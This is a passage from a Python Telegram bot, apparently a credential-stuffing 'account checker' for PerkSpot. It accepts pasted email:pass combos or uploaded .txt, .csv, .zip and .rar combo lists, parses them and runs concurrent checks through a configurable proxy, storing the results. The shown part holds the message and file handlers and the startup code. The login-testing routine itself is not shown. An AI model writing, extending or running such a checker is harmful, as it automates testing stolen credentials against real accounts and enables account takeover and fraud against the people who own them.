            val = int(text.strip())
            c.max_concurrent = val
            await update.message.reply_text(f"Max concurrent set to: {c.max_concurrent}", reply_markup=admin_menu_kb(c))
        except ValueError:
            await update.message.reply_text("Send a number (1-10).", reply_markup=admin_menu_kb(c))
        return

    # ── Auto-detect pasted account ──
    if ":" in text and "@" in text:
        accounts = parse_accounts(text)
        if accounts:
            await update.message.reply_text(f"Detected {len(accounts)} account(s). Checking...")
            await run_check(update, ctx, accounts)
            return

    # Unknown text
    await update.message.reply_text(
        "Send /start for the main menu.\n"
        "Or paste email:pass to check an account.",
        reply_markup=main_menu_kb())


# ═══════════════════════════════════════════════════════════════
#  FILE HANDLER (document uploads)
# ═══════════════════════════════════════════════════════════════
async def file_handler(update, ctx):
    bd = get_bot_data(update)
    state = bd.get("state")
    doc = update.message.document
    if not doc:
        return

    fname = doc.file_name or ""
    fext = fname.rsplit(".", 1)[-1].lower() if "." in fname else ""

    await update.message.reply_text(f"Processing {fname}...")

    accounts = []

    try:
        if fext == "txt" or fext == "csv" or fext == "text":
            file = await doc.get_file()
            content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
            accounts = parse_accounts(content)

        elif fext == "zip":
            file = await doc.get_file()
            content = await file.download_as_bytearray()
            accounts = extract_zip(bytes(content))

        elif fext == "rar":
            file = await doc.get_file()
            tmp = tempfile.mktemp(suffix=".rar")
            await file.download_to_drive(tmp)
            accounts = extract_rar(tmp)
            os.unlink(tmp)

        else:
            await update.message.reply_text(f"Unsupported file type: .{fext}\nSupported: .txt .csv .zip .rar")
            return

    except Exception as e:
        await update.message.reply_text(f"Error processing file: {e}")
        return

    if not accounts:
        await update.message.reply_text(f"No accounts found in {fname}.")
        return

    await update.message.reply_text(f"Found {len(accounts)} account(s) in {fname}. Checking...")
    bd["state"] = None
    await run_check(update, ctx, accounts)


# ═══════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════
def main():
    token = os.environ.get("BOT_TOKEN", "")
    admin_id = os.environ.get("ADMIN_ID", "")

    if not token:
        print("ERROR: Set BOT_TOKEN environment variable")
        print("  export BOT_TOKEN=\"your_telegram_bot_token\"")
        print("  python3 perkspot_bot.py")
        return

    if admin_id:
        try:
            admin_id = int(admin_id)
        except ValueError:
            print(f"WARNING: Invalid ADMIN_ID '{admin_id}', ignoring")
            admin_id = None

    app = Application.builder().token(token).post_init(post_init).build()
    cfg = BotConfig()
    rm = ResultsManager()

    app.bot_data["config"] = cfg
    app.bot_data["results"] = rm
    app.bot_data["checking"] = set()
    app.bot_data["state"] = None

    if admin_id:
        cfg.add_admin(admin_id)
        print(f"Admin ID set: {admin_id}")

    print(f"Bot starting...")
    print(f"  Proxy: {cfg.proxy or 'None'}")
    print(f"  Max concurrent: {cfg.max_concurrent}")
    print(f"  Config: {CONFIG_FILE}")
    print(f"  Results: {RESULTS_DIR}")
    print(f"  Log: {LOG_FILE}")

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("results", cmd_results))
    app.add_handler(CommandHandler("settings", cmd_settings))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    print("\nBot is running! Press Ctrl+C to stop.")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
